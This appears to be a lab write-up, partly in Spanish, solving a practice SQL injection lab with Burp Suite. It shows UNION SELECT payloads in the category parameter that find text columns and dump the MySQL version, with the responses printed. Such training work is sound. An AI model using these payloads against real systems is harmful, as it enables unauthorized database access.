@@ -1,0 +1,53 @@
+➡️  This lab contains a SQL injection vulnerability in the product category filter. 
+
+You can use a UNION attack to retrieve the results from an injected query.
+
+To solve the lab, display the database version string. 
+
+
+🎯 SOLUCIÓN DEL LABORATORIO
+
+    1️⃣ Seleccionar FoxyProxy
+
+        En el navegador seleccionamos la opción BURP en FoxyProxy para que BurpSuite intercepte las peticiones. 
+
+    2️⃣ Abrir BurpSuite
+
+        Se abre BurpSuite y vamos a Proxy > HTTP history
+
+    3️⃣ Navegamos por la web y seleccionamos una categoría
+
+    4️⃣ Interceptamos la request
+
+        Se intercepta la siguiente request:
+
+            GET /filter?category=Accessories HTTP/2
+
+        Y se manda a "Repeater" para modificar la request
+
+    5️⃣ Modificar la request en Repeater
+
+        Se añade '+UNION+SELECT+'abc','def'# sustituyendo el valor de category para determinar qué columnas contienen datos de texto. 
+
+            GET /filter?category='+UNION+SELECT+'abc','def'# HTTP/2
+
+                <table class="is-table-longdescription">
+                    <tbody>
+                    <tr>
+                        <th>test</th>
+                        <td>def</td>
+                    </tr>
+                    </tbody>
+                </table>
+
+    6️⃣ Para saber la versión de la base de datos, se usará el siguiente comando en la request de Repeater: 
+
+        GET /filter?category='+UNION+SELECT+@@version,+NULL# HTTP/1.1
+
+            <table class="is-table-longdescription">
+                <tbody>
+                <tr>
+                    <th>8.0.42-0ubuntu0.20.04.1</th>
+                </tr>
+                </tbody>
+            </table>
